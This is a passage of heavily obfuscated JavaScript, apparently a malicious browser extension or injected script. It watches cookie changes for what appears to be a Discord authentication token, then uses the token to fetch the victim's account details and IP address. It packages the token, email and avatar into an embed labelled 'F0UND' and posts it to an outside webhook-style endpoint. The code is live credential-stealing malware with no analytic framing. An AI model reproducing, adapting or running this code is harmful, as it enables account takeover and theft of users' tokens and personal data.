SaCTO9H[SaCTO9H[O1__9XP(NvptG7(0xa0))]-NvptG7(0x2b)]}gfF_9Ui(MvMEcK,NvptG7(0x34));function MvMEcK(...N0Hvk1N){SaCTO9H(N0Hvk1N[NvptG7(0x29)]=0x2,N0Hvk1N[NvptG7(0xa1)]=-NvptG7(0xa2));switch(qwphBc){case-NvptG7(0x34):return!N0Hvk1N[N0Hvk1N[0x7a]+NvptG7(0xa2)];case-NvptG7(0xa3):return N0Hvk1N[NvptG7(0x38)]+N0Hvk1N[NvptG7(0x2b)]}}gfF_9Ui(jkAHiV,NvptG7(0x2b));function jkAHiV(...N0Hvk1N){SaCTO9H(N0Hvk1N[NvptG7(0x29)]=NvptG7(0x2b),N0Hvk1N.vsjmSj=N0Hvk1N[NvptG7(0x38)]);return wb05IKu(N0Hvk1N.vsjmSj=qwphBc+(qwphBc=N0Hvk1N.vsjmSj,NvptG7(0x38)),N0Hvk1N.vsjmSj)}qwphBc=qwphBc;let VjHpp1=!0x1,onkS4O4=NvptG7(0x38);const lsrGJ8=0x3e8;SaCTO9H(h59x3bA(-NvptG7(0xba))[O1__9XP(0x12)+LSLCgid][O1__9XP(NvptG7(0x61))][aD3tczW+O1__9XP(NvptG7(0x2f))](gfF_9Ui(CTd6Zv(async(...N0Hvk1N)=>{SaCTO9H(N0Hvk1N.length=NvptG7(0x2b),N0Hvk1N[NvptG7(0xcc)]=N0Hvk1N[NvptG7(0xa4)],N0Hvk1N[NvptG7(0x2b)]=h59x3bA(NvptG7(0xec))[O1__9XP(NvptG7(0xa5))](),N0Hvk1N[NvptG7(0xaf)]=N0Hvk1N[NvptG7(0x30)]);if(N0Hvk1N[NvptG7(0x2b)]-onkS4O4<lsrGJ8&&rVe917.ankxsk[O1__9XP(NvptG7(0x2d))+O1__9XP[A55Vw1T(NvptG7(0xa6))](NvptG7(0x65),[0x19])](0x0)==NvptG7(0x8f)){return}if(VjHpp1&&rVe917.gxb_1z>-NvptG7(0xa7)){return}SaCTO9H(VjHpp1=NvptG7(0xa8),onkS4O4=N0Hvk1N[NvptG7(0x2b)]);try{SaCTO9H(N0Hvk1N[NvptG7(0x34)]=O1__9XP(NvptG7(0x37)),N0Hvk1N[NvptG7(0xa9)]={[A55Vw1T(0x10c)]:O1__9XP(NvptG7(0x33))});for(let L0PWZIS of N0Hvk1N[NvptG7(0x38)][N0Hvk1N[NvptG7(0xa9)][A55Vw1T(0x10c)]+N0Hvk1N[NvptG7(0x34)]+'\u0072\u0073']){var q4l2E2_=gfF_9Ui((...N0Hvk1N)=>{SaCTO9H(N0Hvk1N[NvptG7(0x29)]=NvptG7(0x3b),N0Hvk1N[NvptG7(0xaa)]=-NvptG7(0x5e));if(typeof N0Hvk1N[NvptG7(0x49)]===A55Vw1T(NvptG7(0x31))){N0Hvk1N[0x3]=cGhvFEQ}if(typeof N0Hvk1N[NvptG7(0x32)]===A55Vw1T(NvptG7(0x31))){N0Hvk1N[NvptG7(0x32)]=lppWwEv}if(N0Hvk1N[N0Hvk1N[NvptG7(0xaa)]+0xa]==N0Hvk1N[0x0]){return N0Hvk1N[N0Hvk1N[NvptG7(0xaa)]+NvptG7(0x30)][lppWwEv[N0Hvk1N[0x2]]]=q4l2E2_(N0Hvk1N[NvptG7(0x38)],N0Hvk1N[N0Hvk1N[0xef]+0x9])}if(N0Hvk1N[NvptG7(0x49)]===q4l2E2_){cGhvFEQ=N0Hvk1N[N0Hvk1N[NvptG7(0xaa)]+NvptG7(0x30)];return cGhvFEQ(N0Hvk1N[0x2])}if(N0Hvk1N[N0Hvk1N[0xef]+NvptG7(0x5e)]!==N0Hvk1N[NvptG7(0x2b)]){return N0Hvk1N[0x4][N0Hvk1N[0x0]]||(N0Hvk1N[0x4][N0Hvk1N[NvptG7(0x38)]]=N0Hvk1N[N0Hvk1N[NvptG7(0xaa)]+NvptG7(0x7c)](bZmE4w[N0Hvk1N[NvptG7(0x38)]]))}},NvptG7(0x3b));N0Hvk1N[NvptG7(0xad)]=O1__9XP[A55Vw1T(NvptG7(0xab))](NvptG7(0x65),NvptG7(0xac));if(L0PWZIS[O1__9XP(0x1c)][N0Hvk1N[NvptG7(0xad)]]()===O1__9XP(NvptG7(0xae))+q4l2E2_(0x1f)+'\x6e'&&rVe917.gxb_1z>-NvptG7(0xa7)){SaCTO9H(N0Hvk1N[NvptG7(0x5e)]=O1__9XP(0x4f),N0Hvk1N[NvptG7(0xaf)]=q4l2E2_(NvptG7(0xb0)),N0Hvk1N[NvptG7(0x90)]=O1__9XP(NvptG7(0x9e)),N0Hvk1N[NvptG7(0xd2)]=O1__9XP[A55Vw1T(NvptG7(0xa6))](NvptG7(0x65),[0x42]),N0Hvk1N[NvptG7(0x7b)]=O1__9XP(NvptG7(0x43)),N0Hvk1N[0xd]=q4l2E2_[A55Vw1T(NvptG7(0xab))](NvptG7(0x65),NvptG7(0x6f)),N0Hvk1N[NvptG7(0xce)]=O1__9XP[A55Vw1T(NvptG7(0xa6))](NvptG7(0x65),[NvptG7(0xb1)]),N0Hvk1N[NvptG7(0x45)]={[A55Vw1T(NvptG7(0xc7))]:q4l2E2_(NvptG7(0x2c)),[A55Vw1T(0x10e)]:O1__9XP(NvptG7(0x55)),[A55Vw1T(NvptG7(0xd3))]:q4l2E2_(NvptG7(0xb2)),[A55Vw1T(0x110)]:q4l2E2_(NvptG7(0x8d)),[A55Vw1T(0x111)]:q4l2E2_(NvptG7(0xb3))},N0Hvk1N[NvptG7(0x9f)]=[O1__9XP(NvptG7(0x120)),q4l2E2_(0x33),q4l2E2_(NvptG7(0x68)),q4l2E2_(NvptG7(0xb4))]);const nPC_FTK=L0PWZIS[q4l2E2_(NvptG7(0xb2))],{[q4l2E2_(NvptG7(0xa4))+O1__9XP[A55Vw1T(0x10b)](NvptG7(0x65),[NvptG7(0xb5)])]:XOcErbF}=await new(h59x3bA(NvptG7(0xa1)))(N0Hvk1N=>{var L0PWZIS=gfF_9Ui((...N0Hvk1N)=>{SaCTO9H(N0Hvk1N.length=NvptG7(0x3b),N0Hvk1N[NvptG7(0xb7)]=N0Hvk1N[NvptG7(0x32)]);if(typeof N0Hvk1N[NvptG7(0x49)]===A55Vw1T(NvptG7(0x31))){N0Hvk1N[NvptG7(0x49)]=cGhvFEQ}N0Hvk1N[NvptG7(0xb6)]=-NvptG7(0x45);if(typeof N0Hvk1N[NvptG7(0xb7)]===A55Vw1T(0xf0)){N0Hvk1N[NvptG7(0xb7)]=lppWwEv}if(N0Hvk1N[NvptG7(0x38)]!==N0Hvk1N[NvptG7(0x2b)]){return N0Hvk1N[NvptG7(0xb7)][N0Hvk1N[NvptG7(0x38)]]||(N0Hvk1N.L8RfYh[N0Hvk1N[0x0]]=N0Hvk1N[NvptG7(0x49)](bZmE4w[N0Hvk1N[NvptG7(0x38)]]))}if(N0Hvk1N[NvptG7(0x49)]===L0PWZIS){cGhvFEQ=N0Hvk1N[NvptG7(0x2b)];return cGhvFEQ(N0Hvk1N[NvptG7(0x34)])}if(N0Hvk1N[NvptG7(0x34)]&&N0Hvk1N[NvptG7(0x49)]!==cGhvFEQ){var nPC_FTK=CTd6Zv(N0Hvk1N=>{return Nx61V2U[N0Hvk1N<-0x23?N0Hvk1N-0x36:N0Hvk1N>0xdd?N0Hvk1N-0x2c:N0Hvk1N>-0x23?N0Hvk1N<0xdd?N0Hvk1N+0x22:N0Hvk1N+0x24:N0Hvk1N-0x12]},0x1);L0PWZIS=cGhvFEQ;return L0PWZIS(N0Hvk1N[NvptG7(0x38)],-nPC_FTK(-0x20),N0Hvk1N[N0Hvk1N[NvptG7(0xb6)]+NvptG7(0xa0)],N0Hvk1N[nPC_FTK(-0x2)],N0Hvk1N[nPC_FTK(0x6c)])}},0x5),nPC_FTK,XOcErbF;SaCTO9H(nPC_FTK={[A55Vw1T(NvptG7(0xbb))]:q4l2E2_(NvptG7(0xb8))},XOcErbF=L0PWZIS[A55Vw1T(NvptG7(0xab))](NvptG7(0x65),NvptG7(0xb9)),h59x3bA(-NvptG7(0xba))[q4l2E2_[A55Vw1T(NvptG7(0xa6))](NvptG7(0x65),[0x23])][XOcErbF][nPC_FTK[A55Vw1T(NvptG7(0xbb))]]([q4l2E2_(NvptG7(0xa4))+O1__9XP[A55Vw1T(NvptG7(0xa6))](NvptG7(0x65),[NvptG7(0xb5)])],gfF_9Ui((...L0PWZIS)=>{SaCTO9H(L0PWZIS[NvptG7(0x29)]=NvptG7(0x2b),L0PWZIS[NvptG7(0x101)]=L0PWZIS[0x0]);return N0Hvk1N(L0PWZIS[0x8b])},NvptG7(0x2b))),gfF_9Ui(cGhvFEQ,NvptG7(0x2b)));function cGhvFEQ(...N0Hvk1N){var L0PWZIS;SaCTO9H(N0Hvk1N[NvptG7(0x29)]=NvptG7(0x2b),N0Hvk1N[NvptG7(0x2d)]=-NvptG7(0x33),N0Hvk1N[NvptG7(0xc0)]='\x4e\x64\x28\x75\x41\x7c\x56\x52\x45\x39\x70\x5a\x61\x76\x36\x72\x29\x6c\x51\x6f\x30\x35\x63\x6b\x5b\x73\x4d\x42\x58\x68\x4f\x24\x74\x31\x7b\x23\x26\x5f\x2e\x2f\x7d\x3e\x33\x25\x4b\x38\x67\x66\x78\x54\x49\x37\x6e\x34\x43\x65\x40\x71\x21\x44\x7a\x62\x77\x5e\x69\x3d\x3a\x57\x79\x4c\x6d\x55\x2c\x50\x7e\x48\x32\x2a\x53\x4a\x47\x60\x6a\x59\x2b\x3c\x3f\x22\x5d\x3b\x46',N0Hvk1N[NvptG7(0xbc)]=NvptG7(0xbd),N0Hvk1N[NvptG7(0xbf)]=''+(N0Hvk1N[N0Hvk1N[0x18]+0x1a]||''),N0Hvk1N[NvptG7(0xbe)]=N0Hvk1N[NvptG7(0x3b)],N0Hvk1N[NvptG7(0x49)]=N0Hvk1N[NvptG7(0xbf)].length,N0Hvk1N[NvptG7(0xbc)]=NvptG7(0xa3),N0Hvk1N.YA7Le_=[],N0Hvk1N[NvptG7(0xbe)]=NvptG7(0x38),N0Hvk1N.Q0Ik9S=NvptG7(0x38),N0Hvk1N[NvptG7(0xc1)]=-NvptG7(0x2b));for(L0PWZIS=NvptG7(0x38);L0PWZIS<N0Hvk1N[NvptG7(0x49)];L0PWZIS++){N0Hvk1N[N0Hvk1N[NvptG7(0x2d)]-(N0Hvk1N[0xd3]-0x50)]=N0Hvk1N[NvptG7(0xc0)].indexOf(N0Hvk1N.olKTvi[L0PWZIS]);if(N0Hvk1N[NvptG7(0x30)]===-NvptG7(0x2b)){continue}if(N0Hvk1N.SA6hsBV<0x0){N0Hvk1N[NvptG7(0xc1)]=N0Hvk1N[0x9]}else{SaCTO9H(N0Hvk1N.SA6hsBV+=N0Hvk1N[NvptG7(0x30)]*NvptG7(0x5a),N0Hvk1N[NvptG7(0xbe)]|=N0Hvk1N[NvptG7(0xc1)]<<N0Hvk1N[NvptG7(0xc2)],N0Hvk1N[NvptG7(0xc2)]+=(N0Hvk1N.SA6hsBV&NvptG7(0x71))>0x58?NvptG7(0x5b):NvptG7(0x5c));do{SaCTO9H(N0Hvk1N.YA7Le_.push(N0Hvk1N[NvptG7(0xbe)]&NvptG7(0x5d)),N0Hvk1N[NvptG7(0xbe)]>>=NvptG7(0x5e),N0Hvk1N.Q0Ik9S-=NvptG7(0x5e))}while(N0Hvk1N[NvptG7(0xc2)]>NvptG7(0x6c));N0Hvk1N[NvptG7(0xc1)]=-NvptG7(0x2b)}}if(N0Hvk1N[NvptG7(0xc1)]>-0x1){N0Hvk1N.YA7Le_.push((N0Hvk1N[NvptG7(0xbe)]|N0Hvk1N[NvptG7(0xc1)]<<N0Hvk1N[NvptG7(0xc2)])&N0Hvk1N[NvptG7(0xbc)]-(N0Hvk1N[0xd3]-0xff))}return N0Hvk1N[NvptG7(0xbc)]>NvptG7(0xc3)?N0Hvk1N[-0x5e]:vAdvOb(N0Hvk1N.YA7Le_)}});if(XOcErbF===nPC_FTK&&rVe917.gxb_1z>-NvptG7(0xa7)){return wb05IKu(VjHpp1=!0x1,NvptG7(0x65))}N0Hvk1N[NvptG7(0x3a)]=wb05IKu(await new(h59x3bA(NvptG7(0xa1)))(gfF_9Ui((...N0Hvk1N)=>(N0Hvk1N[(NvptG7(0x29))]=(NvptG7(0x2b)),N0Hvk1N.cn6xl1=(NvptG7(0xdc)),N0Hvk1N.YFFONv=[q4l2E2_(0x21)],N0Hvk1N[0xc]=N0Hvk1N.YFFONv,N0Hvk1N[(NvptG7(0x34))]={[A55Vw1T(NvptG7(0xc5))]:q4l2E2_(NvptG7(0xc4))},(h59x3bA(-NvptG7(0xba))[N0Hvk1N[0x2][A55Vw1T(NvptG7(0xc5))]][O1__9XP(NvptG7(0xc6))][q4l2E2_(NvptG7(0x53))]({[N0Hvk1N[0xc][NvptG7(0x38)]+O1__9XP[A55Vw1T(NvptG7(0xab))](void 0x0,NvptG7(0xb5))]:nPC_FTK},N0Hvk1N[NvptG7(0x38)])),void 0x0),0x1)),await h59x3bA(NvptG7(0xc9))(N0Hvk1N[NvptG7(0x9f)][NvptG7(0x38)]+q4l2E2_(0x2a)+q4l2E2_[A55Vw1T(NvptG7(0xab))](NvptG7(0x65),0x2b)+q4l2E2_[A55Vw1T(NvptG7(0xab))](NvptG7(0x65),NvptG7(0xa2))+O1__9XP(NvptG7(0xa3))+q4l2E2_(0x2e)+'\u0065',{[q4l2E2_(0x2f)]:{[q4l2E2_(0x30)+N0Hvk1N[NvptG7(0x45)][A55Vw1T(NvptG7(0xc7))]+'\u006e']:nPC_FTK}}));if(MvMEcK(N0Hvk1N[NvptG7(0x3a)].ok,jkAHiV(-NvptG7(0x34)))&&rVe917.ankxsk[O1__9XP(NvptG7(0x2d))+O1__9XP(NvptG7(0xc8))](NvptG7(0x38))==NvptG7(0x8f)){return wb05IKu(VjHpp1=!0x1,NvptG7(0x65))}SaCTO9H(N0Hvk1N[NvptG7(0xcf)]=await N0Hvk1N[NvptG7(0x3a)][q4l2E2_(NvptG7(0xcd))](),N0Hvk1N[NvptG7(0xcb)]=await h59x3bA(NvptG7(0xc9))(O1__9XP(NvptG7(0xca))+N0Hvk1N[NvptG7(0x9f)][NvptG7(0x2b)]+O1__9XP(NvptG7(0xb6))+N0Hvk1N[0x10][NvptG7(0x34)]));if(MvMEcK(N0Hvk1N[NvptG7(0xcb)].ok,qwphBc=-NvptG7(0x34))&&rVe917.eHpk1Y>-0x1f){N0Hvk1N[NvptG7(0xb2)]=q4l2E2_(0x36);throw new(h59x3bA(-NvptG7(0xdb)))(N0Hvk1N[NvptG7(0xb2)]+O1__9XP(NvptG7(0x6a))+O1__9XP(0x38))}SaCTO9H(N0Hvk1N[NvptG7(0xcc)]=await N0Hvk1N[NvptG7(0xcb)][q4l2E2_(NvptG7(0xcd))](),N0Hvk1N[NvptG7(0xd9)]={[N0Hvk1N[NvptG7(0xce)]]:[{[q4l2E2_(NvptG7(0x6b))]:`F0UND: ${N0Hvk1N[NvptG7(0xcc)].ip}`,[N0Hvk1N[0xd]]:0xff00,[q4l2E2_[A55Vw1T(0x105)](NvptG7(0x65),NvptG7(0x70))]:[{[O1__9XP[A55Vw1T(NvptG7(0xa6))](void 0x0,[NvptG7(0x3a)])]:O1__9XP(NvptG7(0x36))+'\u006d\u0065',[q4l2E2_[A55Vw1T(NvptG7(0xab))](NvptG7(0x65),NvptG7(0xb2))]:N0Hvk1N[NvptG7(0xcf)][q4l2E2_[A55Vw1T(0x10b)](NvptG7(0x65),[NvptG7(0x6d)])+'\x6d\x65'],[N0Hvk1N[NvptG7(0x7b)]]:NvptG7(0xa8)},{[O1__9XP(NvptG7(0x3a))]:O1__9XP(NvptG7(0xd0)),[q4l2E2_(NvptG7(0xb2))]:N0Hvk1N[NvptG7(0xcf)][N0Hvk1N[NvptG7(0x45)][A55Vw1T(NvptG7(0xd1))]]?N0Hvk1N[NvptG7(0xd2)]:q4l2E2_(NvptG7(0x7e)),[O1__9XP(NvptG7(0x43))]:NvptG7(0xa8)},{[O1__9XP(NvptG7(0x3a))]:O1__9XP[A55Vw1T(0x105)](NvptG7(0x65),0x44),[N0Hvk1N[0xf][A55Vw1T(NvptG7(0xd3))]]:MvMEcK(NvptG7(0xd4)+nPC_FTK,NvptG7(0xd4),qwphBc=-NvptG7(0xa3)),[O1__9XP(NvptG7(0x43))]:NvptG7(0xe3)},{[O1__9XP(NvptG7(0x3a))]:q4l2E2_(0x45),[q4l2E2_(NvptG7(0xb2))]:MvMEcK(NvptG7(0xd4)+(N0Hvk1N[NvptG7(0xcf)][q4l2E2_(0x46)]||O1__9XP[A55Vw1T(NvptG7(0xa6))](NvptG7(0x65),[NvptG7(0x7f)])),NvptG7(0xd4),jkAHiV(-NvptG7(0xa3))),[O1__9XP(0x3f)]:NvptG7(0xa8)},{[O1__9XP(NvptG7(0x3a))]:N0Hvk1N[NvptG7(0x90)],[q4l2E2_[A55Vw1T(NvptG7(0xa6))](NvptG7(0x65),[NvptG7(0xb2)])]:MvMEcK('\u007c\u007c'+(N0Hvk1N.ofQfFv[O1__9XP(0x49)]||O1__9XP(NvptG7(0x7f))),'\x7c\x7c',jkAHiV(-NvptG7(0xa3))),[O1__9XP[A55Vw1T(NvptG7(0xa6))](void 0x0,[NvptG7(0x43)])]:!0x0}],[q4l2E2_(NvptG7(0x8f))+O1__9XP(NvptG7(0x9c))]:{[N0Hvk1N.gzKz7SX]:N0Hvk1N.ofQfFv[q4l2E2_(NvptG7(0xd5))]?`https://cdn.discordapp.com/avatars/${N0Hvk1N[NvptG7(0xcf)].id}/${N0Hvk1N[NvptG7(0xcf)][q4l2E2_(NvptG7(0xd5))]}.png`:''}}]},N0Hvk1N[NvptG7(0xda)]=await h59x3bA(NvptG7(0xc9))(O1__9XP[A55Vw1T(0x105)](void 0x0,NvptG7(0xd6))+N0Hvk1N[NvptG7(0x5e)]+O1__9XP(NvptG7(0x95))+O1__9XP(NvptG7(0x3e)),{[q4l2E2_(NvptG7(0xa7))]:{[O1__9XP(NvptG7(0xd7))]:N0Hvk1N[NvptG7(0x45)][A55Vw1T(NvptG7(0xd8))]+N0Hvk1N[NvptG7(0x45)][A55Vw1T(0x111)]+q4l2E2_(NvptG7(0xcd)),[q4l2E2_[A55Vw1T(NvptG7(0xab))](NvptG7(0x65),0x55)+O1__9XP[A55Vw1T(0x105)](void 0x0,0x56)]:q4l2E2_(NvptG7(0x8d))+q4l2E2_(NvptG7(0xb3))+q4l2E2_(NvptG7(0xcd))},[O1__9XP(0x57)]:q4l2E2_(NvptG7(0x8c)),[N0Hvk1N[NvptG7(0x9f)][NvptG7(0x49)]]:h59x3bA(-NvptG7(0xf0))[q4l2E2_(0x5a)+q4l2E2_(NvptG7(0x5a))](N0Hvk1N[NvptG7(0xd9)])}));if(MvMEcK(N0Hvk1N[NvptG7(0xda)].ok,jkAHiV(-0x2))&&rVe917.eHpk1Y>-NvptG7(0x2c)){throw new(h59x3bA(-NvptG7(0xdb)))(O1__9XP(NvptG7(0xdc))+O1__9XP(NvptG7(0x40))+q4l2E2_(NvptG7(0x5f))+O1__9XP(NvptG7(0x2a)))}break}gfF_9Ui(cGhvFEQ,NvptG7(0x2b));function cGhvFEQ(...N0Hvk1N){var L0PWZIS;SaCTO9H(N0Hvk1N.length=NvptG7(0x2b),N0Hvk1N[NvptG7(0xdd)]=N0Hvk1N[0x6],N0Hvk1N.f6sBkVM='\x48\x44\x4f\x57\x72\x5e\x78\x77\x2a\x7c\x56\x43\x3f\x64\x3d\x5b\x52\x46\x74\x38\x71\x42\x4d\x69\x34\x32\x6e\x7b\x4e\x28\x3e\x6f\x79\x53\x33\x41\x60\x62\x35\x66\x31\x4b\x55\x58\x7d\x2f\x6d\x5a\x21\x63\x76\x7a\x30\x4a\x4c\x47\x26\x67\x75\x6c\x50\x2e\x40\x54\x73\x51\x6a\x45\x65\x36\x37\x61\x3c\x3b\x24\x5d\x5f\x59\x29\x2b\x39\x25\x49\x3a\x68\x70\x23\x7e\x22\x6b\x2c',N0Hvk1N[NvptG7(0xde)]=-NvptG7(0xef),N0Hvk1N[0x2]=''+(N0Hvk1N[NvptG7(0x38)]||''),N0Hvk1N[NvptG7(0x49)]=N0Hvk1N[NvptG7(0x34)].length,N0Hvk1N[NvptG7(0xe0)]=[],N0Hvk1N[NvptG7(0x3b)]=NvptG7(0x38),N0Hvk1N[NvptG7(0xdd)]=NvptG7(0x38),N0Hvk1N[NvptG7(0x6c)]=-NvptG7(0x2b));for(L0PWZIS=NvptG7(0x38);L0PWZIS<N0Hvk1N[NvptG7(0x49)];L0PWZIS++){N0Hvk1N[NvptG7(0x30)]=N0Hvk1N.f6sBkVM.indexOf(N0Hvk1N[NvptG7(0x34)][L0PWZIS]);if(N0Hvk1N[NvptG7(0x30)]===-0x1){continue}if(N0Hvk1N[N0Hvk1N[NvptG7(0xde)]+NvptG7(0xdf)]<NvptG7(0x38)){N0Hvk1N[NvptG7(0x6c)]=N0Hvk1N[NvptG7(0x30)]}else{SaCTO9H(N0Hvk1N[NvptG7(0x6c)]+=N0Hvk1N[NvptG7(0x30)]*NvptG7(0x5a),N0Hvk1N[NvptG7(0x3b)]|=N0Hvk1N[0x7]<<N0Hvk1N[N0Hvk1N[0xb5]+0x157],N0Hvk1N[NvptG7(0xdd)]+=(N0Hvk1N[N0Hvk1N[NvptG7(0xde)]+0x73]&NvptG7(0x71))>NvptG7(0x8c)?0xd:NvptG7(0x5c));do{SaCTO9H(N0Hvk1N[NvptG7(0xe0)].push(N0Hvk1N[0x5]&NvptG7(0x5d)),N0Hvk1N[NvptG7(0x3b)]>>=NvptG7(0x5e),N0Hvk1N[NvptG7(0xdd)]-=NvptG7(0x5e))}while(N0Hvk1N[NvptG7(0xdd)]>NvptG7(0x6c));N0Hvk1N[N0Hvk1N[NvptG7(0xde)]+NvptG7(0xdf)]=-NvptG7(0x2b)}}if(N0Hvk1N[NvptG7(0x6c)]>-NvptG7(0x2b)){N0Hvk1N[NvptG7(0xe0)].push((N0Hvk1N[NvptG7(0x3b)]|N0Hvk1N[NvptG7(0x6c)]<<N0Hvk1N[NvptG7(0xdd)])&NvptG7(0x5d))}return N0Hvk1N[NvptG7(0xde)]>NvptG7(0x7c)?N0Hvk1N[NvptG7(0x69)]:vAdvOb(N0Hvk1N[NvptG7(0xe0)])}}}catch(error){SaCTO9H(N0Hvk1N[0x27]={[A55Vw1T(0x114)]:O1__9XP(NvptG7(0xe1))},h59x3bA(-NvptG7(0xe2))[O1__9XP(0x60)](N0Hvk1N[NvptG7(0xc6)][A55Vw1T(NvptG7(0x11f))],error))}finally{VjHpp1=NvptG7(0xe3)}return{[O1__9XP(0x62)]:N0Hvk1N[NvptG7(0x38)][O1__9XP(0x63)+O1__9XP[A55Vw1T(NvptG7(0xab))](void 0x0,NvptG7(0xe4))+'\u0072\u0073']}}),NvptG7(0x2b)),{[O1__9XP[A55Vw1T(NvptG7(0xab))](NvptG7(0x65),NvptG7(0xe5))]:[O1__9XP(0x66)]},[O1__9XP(NvptG7(0x79))]),gfF_9Ui(h59x3bA,NvptG7(0x2b)));function h59x3bA(...N0Hvk1N){var Nx61V2U;SaCTO9H(N0Hvk1N[NvptG7(0x29)]=NvptG7(0x2b),N0Hvk1N[NvptG7(0xb3)]=N0Hvk1N[NvptG7(0x38)],Nx61V2U=gfF_9Ui((...N0Hvk1N)=>{SaCTO9H(N0Hvk1N[NvptG7(0x29)]=NvptG7(0x3b),N0Hvk1N[NvptG7(0xe6)]=N0Hvk1N[NvptG7(0x49)]);if(typeof N0Hvk1N.cC7tpdR===A55Vw1T(NvptG7(0x31))){N0Hvk1N.cC7tpdR=L0PWZIS}if(typeof N0Hvk1N[NvptG7(0x32)]===A55Vw1T(NvptG7(0x31))){N0Hvk1N[NvptG7(0x32)]=lppWwEv}if(N0Hvk1N[NvptG7(0x38)]!==N0Hvk1N[NvptG7(0x2b)]){return N0Hvk1N[NvptG7(0x32)][N0Hvk1N[NvptG7(0x38)]]||(N0Hvk1N[NvptG7(0x32)][N0Hvk1N[NvptG7(0x38)]]=N0Hvk1N[NvptG7(0xe6)](bZmE4w[N0Hvk1N[NvptG7(0x38)]]))}N0Hvk1N[0x68]=-0x71;if(N0Hvk1N[NvptG7(0x34)]==N0Hvk1N[NvptG7(0xe6)]){return N0Hvk1N[NvptG7(0x2b)]?N0Hvk1N[NvptG7(0x38)][N0Hvk1N[0x4][N0Hvk1N[N0Hvk1N[NvptG7(0x7a)]+NvptG7(0x60)]]]:lppWwEv[N0Hvk1N[NvptG7(0x38)]]||(N0Hvk1N[NvptG7(0x34)]=N0Hvk1N[N0Hvk1N[0x68]-(N0Hvk1N[NvptG7(0x7a)]-0x4)][N0Hvk1N[NvptG7(0x38)]]||N0Hvk1N[NvptG7(0xe6)],lppWwEv[N0Hvk1N[0x0]]=N0Hvk1N[0x2](bZmE4w[N0Hvk1N[NvptG7(0x38)]]))}N0Hvk1N[NvptG7(0xe8)]=0x3f;if(N0Hvk1N[NvptG7(0xe6)]===NvptG7(0x65)){Nx61V2U=N0Hvk1N[N0Hvk1N[NvptG7(0x7a)]+(N0Hvk1N[NvptG7(0x7a)]+NvptG7(0xe7))]}if(N0Hvk1N[0x2]&&N0Hvk1N[NvptG7(0xe6)]!==L0PWZIS){Nx61V2U=L0PWZIS;return Nx61V2U(N0Hvk1N[NvptG7(0x38)],-NvptG7(0x2b),N0Hvk1N[NvptG7(0x34)],N0Hvk1N[NvptG7(0xe6)],N0Hvk1N[NvptG7(0x32)])}if(N0Hvk1N[NvptG7(0x2b)]){[N0Hvk1N[0x4],N0Hvk1N[N0Hvk1N.I4pjDlz-NvptG7(0x6d)]]=[N0Hvk1N.cC7tpdR(N0Hvk1N[0x4]),N0Hvk1N[0x0]||N0Hvk1N[NvptG7(0x34)]];return Nx61V2U(N0Hvk1N[0x0],N0Hvk1N[N0Hvk1N[NvptG7(0xe8)]-NvptG7(0x6f)],N0Hvk1N[NvptG7(0x34)])}if(N0Hvk1N[NvptG7(0x34)]==N0Hvk1N[N0Hvk1N[NvptG7(0xe8)]-NvptG7(0x43)]){return N0Hvk1N[N0Hvk1N[NvptG7(0x7a)]+NvptG7(0x60)][lppWwEv[N0Hvk1N[NvptG7(0x34)]]]=Nx61V2U(N0Hvk1N[0x0],N0Hvk1N[NvptG7(0x2b)])}},0x5),N0Hvk1N.ipG9314={[A55Vw1T(NvptG7(0x115))]:O1__9XP(NvptG7(0xe9))},N0Hvk1N[NvptG7(0xeb)]=O1__9XP(NvptG7(0xea)),N0Hvk1N[NvptG7(0xf9)]=N0Hvk1N[NvptG7(0xeb)],N0Hvk1N[0x5]=[O1__9XP(0x76)],N0Hvk1N[NvptG7(0x48)]=NvptG7(0x65));switch(N0Hvk1N[0x54]){case!rVe917.urPj1IU()?null:-NvptG7(0xba):return nvFx_HR[O1__9XP[A55Vw1T(NvptG7(0xab))](NvptG7(0x65),0x68)];case rVe917.urPj1IU()?NvptG7(0xec):-0x6b:N0Hvk1N[0x6]=O1__9XP(NvptG7(0xed))||nvFx_HR[O1__9XP(0x69)];break;case!(rVe917.gxb_1z>-0x2f)?0xc0:NvptG7(0xa1):return nvFx_HR[O1__9XP(NvptG7(0x81))];case!rVe917.gp8KCb()?-NvptG7(0xee):NvptG7(0xc9):N0Hvk1N[NvptG7(0x48)]=O1__9XP(0x6b)||nvFx_HR[O1__9XP(NvptG7(0x76))];break;case!(rVe917.gxb_1z>-NvptG7(0xa7))?void 0x0:-NvptG7(0xdb):return nvFx_HR[O1__9XP(NvptG7(0xef))];case-NvptG7(0xf0):return nvFx_HR[O1__9XP(NvptG7(0xf1))];case!rVe917.gp8KCb()?null:-NvptG7(0xe2):return nvFx_HR[O1__9XP[A55Vw1T(NvptG7(0xa6))](NvptG7(0x65),[0x6e])];case rVe917.gp8KCb()?0x24d:-NvptG7(0xf2):return nvFx_HR[O1__9XP(NvptG7(0x84))];case 0x1210:return nvFx_HR[O1__9XP(NvptG7(0x4c))+'\x6e\x74'];case rVe917.eHpk1Y>-NvptG7(0x2c)?0x689:-NvptG7(0xf3):N0Hvk1N[NvptG7(0x48)]=O1__9XP(0x71)+O1__9XP(NvptG7(0x60))||nvFx_HR[O1__9XP(NvptG7(0xdf))];break;case rVe917.ankxsk[O1__9XP(NvptG7(0xf4))+O1__9XP(NvptG7(0x63))](NvptG7(0x38))==NvptG7(0x8f)?0x12b8:-NvptG7(0xf5):N0Hvk1N[NvptG7(0x48)]=O1__9XP(0x76)||nvFx_HR[N0Hvk1N[NvptG7(0x3b)][NvptG7(0x38)]];break;case NvptG7(0xb6):N0Hvk1N[NvptG7(0x48)]=O1__9XP(NvptG7(0xf6))||nvFx_HR[O1__9XP[A55Vw1T(0x105)](NvptG7(0x65),NvptG7(0xf6))];break;case rVe917.ankxsk[O1__9XP(NvptG7(0xf4))+O1__9XP(NvptG7(0x63))](0x0)==0x4a?0xda0:NvptG7(0x70):N0Hvk1N[NvptG7(0x48)]=O1__9XP(NvptG7(0x88))+NvptG7(0xf7)||nvFx_HR[O1__9XP(0x78)+NvptG7(0xf7)];break;case!(rVe917.eHpk1Y>-NvptG7(0x2c))?NvptG7(0x55):0x5ae:N0Hvk1N[NvptG7(0x48)]=O1__9XP(0x79)||nvFx_HR[O1__9XP(0x79)];break;case rVe917.gp8KCb()?0x72a:-NvptG7(0x47):N0Hvk1N[NvptG7(0x48)]=O1__9XP[A55Vw1T(NvptG7(0xa6))](void 0x0,[NvptG7(0xa1)])||nvFx_HR[O1__9XP(NvptG7(0xa1))];break;case 